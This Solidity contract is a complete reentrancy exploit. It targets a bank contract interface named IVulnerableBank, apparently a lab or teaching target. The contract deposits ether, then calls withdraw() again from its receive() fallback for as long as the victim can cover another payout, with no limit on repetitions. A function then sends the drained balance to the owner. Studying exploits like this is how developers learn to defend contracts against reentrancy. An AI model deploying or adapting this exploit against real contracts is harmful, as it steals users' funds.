// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function withdrawNoChecks(uint256 amount) external;  
}

contract Attacker_drainAll {
    IVulnerableBank public immutable target;
    address public owner;
    uint256 public attackCount;
    uint256 public depositAmount; // the fixed amount withdraw() will try to send each reentrant call

    constructor(address _target) {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }

    // Kicks off the attack: deposit, then trigger the first withdraw.
    // No MAX_ATTACKS cap - the attack continues as long as the victim
    // still holds enough balance to cover another withdrawal.
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack with");
        attackCount = 0;
        depositAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
    attackCount++;
    uint256 remaining = address(target).balance;

    // withdraw() always sends the caller's full recorded balance (depositAmount) -
    // it has no partial-amount option. If remaining < depositAmount, calling it
    // again would fail on-chain and, since withdraw() reverts on failure, that
    // revert would cascade back through every nested call and undo the whole
    // attack. So only keep reentering while the bank can still fully cover it.
    if (remaining >= depositAmount) {
        target.withdraw();
    }
}
}